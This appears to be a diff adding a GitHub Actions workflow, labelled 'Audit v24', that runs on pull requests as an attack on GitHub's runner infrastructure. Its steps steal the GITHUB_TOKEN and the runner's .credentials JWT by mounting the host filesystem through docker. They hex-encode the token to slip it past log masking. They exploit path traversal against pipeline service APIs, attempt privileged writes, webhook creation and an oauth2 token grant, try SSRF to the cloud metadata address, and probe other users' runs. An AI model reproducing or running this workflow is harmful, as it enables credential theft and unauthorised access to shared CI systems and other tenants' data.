@@ -1,0 +1,422 @@
+name: Audit v24
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  id-token: write
+  actions: write
+  packages: write
+  checks: write
+  statuses: write
+  deployments: write
+  issues: write
+
+jobs:
+  audit-v24:
+    runs-on: ubuntu-latest
+    env:
+      UPSTREAM_OWNER: twrps
+      UPSTREAM_REPO: PoC-RACE2
+      FORK_OWNER: lacaag
+      FORK_REPO: PoC-RACE2
+    steps:
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 1: Harvest + credential JWT (hex extraction proven)
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 1 - Harvest
+        if: always()
+        run: |
+          set +e
+          echo "=== V24 HARVEST ==="
+          echo "$PATH" > /tmp/saved_path.txt
+          RT="${{ secrets.GITHUB_TOKEN }}"
+          echo "$RT" > /tmp/rt.txt
+
+          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
+          if [ -f "$WLOG" ]; then
+            RUN_URL=$(grep -oP '"url"\s*:\s*"https://run-actions[^"]+' "$WLOG" | head -1 | sed 's/"url"\s*:\s*"//')
+            echo "RUN_URL=$RUN_URL"; echo "$RUN_URL" > /tmp/run_url.txt
+            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
+              VAL=$(grep -oP "\"${KEY}\"\\s*:\\s*\"\\K[^\"]+" "$WLOG" | head -1)
+              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
+            done
+            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            echo "PLAN=$PLAN JOB=$JOB"
+            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
+          fi
+
+          # Hex credential extraction
+          docker run --rm -v /:/h alpine sh -c '
+            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
+            if [ -f "$F" ]; then
+              echo "CRED_HEX_START"
+              xxd -p "$F" | tr -d "\n"
+              echo ""
+              echo "CRED_HEX_END"
+            fi
+          ' 2>/dev/null > /tmp/hex_extract.txt
+
+          python3 << 'PYEOF'
+          import binascii, json, base64
+          try:
+            raw = open('/tmp/hex_extract.txt').read()
+            s = raw.find('CRED_HEX_START'); e = raw.find('CRED_HEX_END')
+            if s >= 0 and e >= 0:
+              h = raw[s+len('CRED_HEX_START'):e].strip()
+              decoded = binascii.unhexlify(h).decode('utf-8')
+              data = json.loads(decoded)
+              token = data.get('Data', {}).get('token', '')
+              open('/tmp/cred_token.txt', 'w').write(token)
+              print(f"CTOK_LEN={len(token)}")
+              # JWT claims
+              parts = token.split('.')
+              if len(parts) >= 2:
+                padded = parts[1] + '=' * (4 - len(parts[1]) % 4)
+                claims = json.loads(base64.urlsafe_b64decode(padded))
+                # Find the sub field or any field that matches clientId requirement
+                for k in sorted(claims.keys()):
+                  v = str(claims[k])
+                  if len(v) < 100:
+                    print(f"  {k}={v}")
+          except Exception as ex:
+            print(f"ERR: {ex}")
+          PYEOF
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 2: EXPLOIT path traversal — parent scope enumeration
+      # v23 CONFIRMED: ../_apis/connectionData returns DIFFERENT instance
+      # Normal: instanceId=8f795dfa, Traversed: instanceId=16cc8db7
+      # Now enumerate EVERYTHING accessible from parent scope
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 2 - Parent scope enum
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== PARENT SCOPE ENUMERATION ==="
+          RT=$(cat /tmp/rt.txt)
+          BASE="https://pipelinesghubeus14.actions.githubusercontent.com"
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PLAN=$(cat /tmp/plan.txt 2>/dev/null)
+
+          # A: Full connectionData from traversed path (to see ALL service definitions)
+          echo "--- A: Traversed connectionData ---"
+          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $RT" \
+            "$BASE/../_apis/connectionData?connectOptions=1&lastChangeId=-1&includeServices=true")
+          echo "instanceId: $(echo "$R" | jq -r '.instanceId' 2>/dev/null)"
+          echo "deploymentId: $(echo "$R" | jq -r '.deploymentId' 2>/dev/null)"
+          echo "authenticatedUser: $(echo "$R" | jq -c '.authenticatedUser' 2>/dev/null)"
+          echo "authorizedUser: $(echo "$R" | jq -c '.authorizedUser' 2>/dev/null)"
+          echo "serviceDefinitions count: $(echo "$R" | jq '.locationServiceData.serviceDefinitions | length' 2>/dev/null)"
+          # List ALL service definitions from parent scope
+          echo "$R" | jq -c '.locationServiceData.serviceDefinitions[]? | {serviceType, displayName, relativePath}' 2>/dev/null | head -40
+          echo ""
+
+          # B: Compare resource areas — parent vs sandboxed
+          echo "--- B: Traversed resourceareas ---"
+          R=$(/usr/bin/curl -sS -H "Authorization: Bearer $RT" \
+            "$BASE/../_apis/resourceareas")
+          echo "$R" | jq -c '.value[]? | {name, id, locationUrl}' 2>/dev/null
+          echo ""
+
+          # C: Hit ALL distributedtask endpoints from parent scope
+          echo "--- C: Parent distributedtask ---"
+          for EP in \
+            "_apis/distributedtask/plans/$PLAN/timelines" \
+            "_apis/distributedtask/plans/$PLAN/logs" \
+            "_apis/distributedtask/plans/$PLAN/events" \
+            "_apis/distributedtask/events" \
+            "_apis/distributedtask/agents" \
+            "_apis/distributedtask/agentpools" \
+            "_apis/distributedtask/variablegroups" \
+            "_apis/distributedtask/securefiles" \
+            "_apis/distributedtask/queues" \
+            "_apis/distributedtask/environments" \
+            "_apis/distributedtask/tasks" \
+            "_apis/distributedtask/deploymentgroups"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $RT" "$BASE/../$EP")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "C $EP = $CODE | $(echo "$BODY" | head -c 300)"
+          done
+          echo ""
+
+          # D: Build/pipeline/actions from parent scope
+          echo "--- D: Parent build/pipeline/actions ---"
+          for EP in \
+            "_apis/build/builds" \
+            "_apis/build/definitions" \
+            "_apis/pipelines" \
+            "_apis/pipelines/runs" \
+            "_apis/actions/gates" \
+            "_apis/actions/containers" \
+            "_apis/runner/registration" \
+            "_apis/runner/pools" \
+            "_apis/runner/agents" \
+            "_apis/PipelinesChecks/runs" \
+            "_apis/PipelinesChecks/configurations" \
+            "_apis/runtime/pipelines" \
+            "_apis/serviceendpoint/endpoints" \
+            "_apis/serviceendpoint/types"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $RT" "$BASE/../$EP")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "D $EP = $CODE | $(echo "$BODY" | head -c 300)"
+          done
+          echo ""
+
+          # E: Security/graph/audit from parent scope
+          echo "--- E: Parent security ---"
+          for EP in \
+            "_apis/security/permissionnamespaces" \
+            "_apis/accesscontrollists" \
+            "_apis/graph/users" \
+            "_apis/graph/groups" \
+            "_apis/graph/memberships" \
+            "_apis/tokenadmin/personalaccesstokens" \
+            "_apis/audit/streams" \
+            "_apis/audit/auditlog" \
+            "_apis/notification/subscriptions" \
+            "_apis/hooks/subscriptions" \
+            "_apis/ExtensionManagement/InstalledExtensions" \
+            "_apis/userentitlements" \
+            "_apis/securityroles/scopes" \
+            "_apis/wiki/wikis" \
+            "_apis/feed/feeds" \
+            "_apis/packaging/feeds"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $RT" "$BASE/../$EP")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "E $EP = $CODE | $(echo "$BODY" | head -c 300)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 3: Write operations via traversed path
+      # If parent scope has different permissions, writes might work
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 3 - Traversed writes
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== TRAVERSED WRITES ==="
+          RT=$(cat /tmp/rt.txt)
+          BASE="https://pipelinesghubeus14.actions.githubusercontent.com"
+          PLAN=$(cat /tmp/plan.txt 2>/dev/null)
+
+          # A: Create log via parent scope
+          echo "--- A: Create log ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
+            "$BASE/../_apis/distributedtask/plans/$PLAN/logs" \
+            -d '{"path":"v24-traversed-inject"}')
+          CODE=$(echo "$R" | tail -1)
+          echo "A log = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+
+          # B: POST event via parent scope
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
+            "$BASE/../_apis/distributedtask/events" \
+            -d '{"name":"v24-traversed","data":"inject"}')
+          CODE=$(echo "$R" | tail -1)
+          echo "B event = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+
+          # C: Create variable group via parent scope
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
+            "$BASE/../_apis/distributedtask/variablegroups" \
+            -d '{"name":"v24-traversed","type":"Vsts","variables":{"secret":{"value":"v24","isSecret":true}}}')
+          CODE=$(echo "$R" | tail -1)
+          echo "C vargroup = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+
+          # D: Upload secure file via parent scope
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $RT" -H "Content-Type: application/octet-stream" \
+            "$BASE/../_apis/distributedtask/securefiles?name=v24.key" \
+            --data-binary "V24-TRAVERSED-SECRET")
+          CODE=$(echo "$R" | tail -1)
+          echo "D securefile = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+
+          # E: Register agent via parent scope
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
+            "$BASE/../_apis/runner/registration" \
+            -d '{"name":"v24-traversed-runner","labels":["v24"]}')
+          CODE=$(echo "$R" | tail -1)
+          echo "E registration = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+
+          # F: Create hook subscription via parent scope
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
+            "$BASE/../_apis/hooks/subscriptions" \
+            -d '{"publisherId":"v24","eventType":"v24","consumerId":"webHooks","consumerActionId":"httpRequest","consumerInputs":{"url":"https://v24.example.com/hook"}}')
+          CODE=$(echo "$R" | tail -1)
+          echo "F hook = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+
+          # G: oauth2/token via parent scope!
+          echo "--- G: Traversed oauth2 ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Content-Type: application/x-www-form-urlencoded" \
+            "$BASE/../_apis/oauth2/token" \
+            -d "grant_type=client_credentials&client_assertion=$RT&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_id=v24&scope=vso.full_access")
+          CODE=$(echo "$R" | tail -1)
+          echo "G oauth2 = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+
+          # H: Try service endpoint creation as SSRF via parent scope
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
+            "$BASE/../_apis/serviceendpoint/endpoints" \
+            -d '{"name":"v24-ssrf","type":"generic","url":"http://169.254.169.254/metadata/instance?api-version=2021-02-01","authorization":{"parameters":{},"scheme":"None"}}')
+          CODE=$(echo "$R" | tail -1)
+          echo "H serviceendpoint = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 4: Cross-run access via path traversal
+      # Try to access OTHER runs' plan data through parent scope
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 4 - Cross-run probe
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== CROSS-RUN PROBE ==="
+          RT=$(cat /tmp/rt.txt)
+          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
+          BASE="https://pipelinesghubeus14.actions.githubusercontent.com"
+          RUN_URL=$(cat /tmp/run_url.txt 2>/dev/null)
+
+          # A: Try random secret path segments via traversal
+          echo "--- A: Other secret paths ---"
+          for SEG in \
+            "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
+            "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" \
+            "test" \
+            "admin" \
+            "internal" \
+            "default" \
+            "" \
+            "00000000000000000000000000000000000000000000000000"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $RT" "$BASE/$SEG/_apis/connectionData")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+              echo "A $SEG = $CODE iid=$(echo "$BODY" | jq -r '.instanceId // empty' 2>/dev/null)"
+          done
+          echo ""
+
+          # B: Run-service cross-run deep probe
+          echo "--- B: Run-service cross-run ---"
+          if [ -n "$RUN_URL" ]; then
+            RUN_BASE=$(echo "$RUN_URL" | grep -oP 'https://[^/]+')
+            RUN_NUM=$(echo "$RUN_URL" | grep -oP '/[0-9]+/$' | tr -d '/')
+
+            # Try many adjacent run numbers
+            for N in $(seq $((RUN_NUM-5)) $((RUN_NUM+5))); do
+              [ "$N" -eq "$RUN_NUM" ] && continue
+              [ "$N" -lt 1 ] && continue
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+                -H "Authorization: Bearer $RT" "$RUN_BASE/$N/")
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              echo "B run/$N = $CODE | $(echo "$BODY" | head -c 100)"
+            done
+            echo ""
+
+            # Try with credential JWT on adjacent runs
+            if [ -n "$CTOK" ] && [ ${#CTOK} -gt 10 ]; then
+              echo "--- B2: Cred JWT on adjacent runs ---"
+              for N in $((RUN_NUM-1)) $((RUN_NUM+1)) 1 2; do
+                [ "$N" -lt 1 ] && continue
+                R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+                  -H "Authorization: Bearer $CTOK" "$RUN_BASE/$N/")
+                CODE=$(echo "$R" | tail -1)
+                BODY=$(echo "$R" | sed '$d')
+                echo "B2 cred/$N = $CODE | $(echo "$BODY" | head -c 100)"
+              done
+            fi
+          fi
+          echo ""
+
+          # C: Pipeline service — try accessing other plans
+          echo "--- C: Cross-plan ---"
+          PURL=$(cat /tmp/PipelinesServiceUrl.txt 2>/dev/null)
+          PLAN=$(cat /tmp/plan.txt 2>/dev/null)
+          if [ -n "$PURL" ] && [ -n "$PLAN" ]; then
+            # Modify last char of plan UUID to probe adjacent plans
+            PLAN_BASE=$(echo "$PLAN" | head -c 35)
+            for SUFFIX in "0" "1" "2" "3" "4" "5" "6" "7" "8" "9" "a" "b" "c" "d" "e" "f"; do
+              TEST_PLAN="${PLAN_BASE}${SUFFIX}"
+              [ "$TEST_PLAN" = "$PLAN" ] && continue
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 4 \
+                -H "Authorization: Bearer $RT" "${PURL}_apis/distributedtask/plans/$TEST_PLAN/timelines")
+              CODE=$(echo "$R" | tail -1)
+              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+                echo "C cross-plan $SUFFIX = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+            done
+          fi
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 5: Broker service (from .runner serverUrlV2)
+      # .runner showed ServerUrlV2=https://broker.actions.githubusercontent.com
+      # This is a different service entirely
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 5 - Broker
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== BROKER SERVICE ==="
+          RT=$(cat /tmp/rt.txt)
+          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
+          BROKER="https://broker.actions.githubusercontent.com"
+
+          for TOK in "$RT" "$CTOK"; do
+            [ -z "$TOK" ] || [ ${#TOK} -lt 10 ] && continue
+            PFX=$(echo -n "$TOK" | head -c 12)
+            echo "=== AUTH: $PFX ==="
+            for EP in \
+              "" \
+              "_apis/connectionData" \
+              "_apis/resourceareas" \
+              "api/v3/actions/runner-groups" \
+              "api/v3/actions/runners" \
+              "_apis/distributedtask/pools" \
+              "_apis/distributedtask/agents" \
+              "health" \
+              "healthcheck" \
+              ".well-known/openid-configuration"; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+                -H "Authorization: Bearer $TOK" "$BROKER/$EP")
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+                echo "$EP = $CODE | $(echo "$BODY" | head -c 300)"
+            done
+            echo ""
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 6: Final
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 6 - Final
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== V24 FINAL ==="
+          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
+          echo "CTOK_LEN=$(wc -c < /tmp/cred_token.txt 2>/dev/null)"
+          echo "=== V24 COMPLETE ==="
